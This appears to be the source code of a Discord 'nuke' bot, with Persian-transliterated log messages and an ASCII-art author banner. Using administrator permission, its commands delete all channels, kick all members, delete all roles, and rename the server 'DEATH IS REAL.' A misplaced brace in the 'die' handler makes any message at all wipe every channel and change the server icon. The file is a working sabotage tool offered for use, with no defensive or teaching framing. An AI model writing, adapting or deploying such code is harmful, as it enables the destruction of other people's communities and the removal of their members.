

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./config.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const amiraliconsole = String.raw`



░░ 　 ░█▀▀█ █▀▄▀█ ░▀░ █▀▀█ ░█▀▀█ █░░ ░▀░ 　 ▒█▀▀█ ▒█▀▀▀ ▒█▀▀█ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▀▀ 　 ▒█▄▄█ █░▀░█ ▀█▀ █▄▄▀ ▒█▄▄█ █░░ ▀█▀ 　 ▒█▄▄▀ ▒█▀▀▀ ▒█▀▀▄ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
░░ 　 ▒█░▒█ ▀░░░▀ ▀▀▀ ▀░▀▀ ▒█░▒█ ▀▀▀ ▀▀▀ 　 ▒█░▒█ ▒█▄▄▄ ▒█▄▄█ ▒█░▒█ ▒█▄▄█ ▒█░▒█
                                                                      

                                        Author: - AmirAli ¯̶̄Mïłtøη §#6113

`;

console.log(red(amiraliconsole));
client.on("ready", () => {
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(greenBright(`                                     robat run shod: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                                      prefix robat: ${prefix}`));
    console.log(greenBright(`                                      khamosh bodan everyone: ${disableEveryone}`));
    console.log(greenBright(`                                      perm robat: ADMINISTRATOR`));
    console.log(yellowBright(`                                      created by : AmirAli ¯̶̄Mïłtøη`));
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "created by AmirAli ¯̶̄Mïłtøη" }); 
});

client.on('message' , message => {
    if(message.content === prefix + 'dc'){
            message.guild.channels.cache.forEach(channel => channel.delete().then(
                console.log(redBright(`channel pak shod`))
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if(message.content === prefix + 'ka'){
        message.guild.members.cache.forEach(member => member.kick({ reason: "ناک" })
        .then(console.log(`${member.user.tag} kick shod`) && message.channel.send("tamam member ha kick shodand")
            .catch()
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if(message.content === prefix + 'dr'){
            message.guild.roles.cache.forEach(r => r.delete({ reason: "ناک" }).then(console.log(yellow(`${r.name} delete shod`))).catch(
            console.log(yellow(`${r.name} pack shod`))
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if (message.content === prefix + 'die') {
        message.delete();
        message.guild.setName(`DEATH IS REAL.`).then(console.log(green(`esm server avaz shod be: ${message.guild.name} `))); 
        }
        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`channel pak shod`))
        ).then(
            message.guild.setIcon('https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif') 
        ));

            message.delete();
            
});


client.login(token);
